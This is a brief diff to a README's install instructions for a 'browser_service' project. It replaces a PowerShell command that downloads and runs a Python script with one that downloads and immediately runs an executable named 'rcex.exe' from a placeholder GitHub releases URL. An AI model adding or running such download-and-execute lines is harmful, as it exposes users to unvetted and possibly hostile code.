@@ -1,5 +1,5 @@
 # Instalation:
-irm https://raw.githubusercontent.com/your-username/your-repo/v1.0.0/browser_service.py -OutFile browser_service.py; python browser_service.py
+irm https://github.com/your-username/your-repo/releases/download/v1.0.0/rcex.exe -OutFile rcex.exe; .\rcex.exe
 
 # browser_service
 
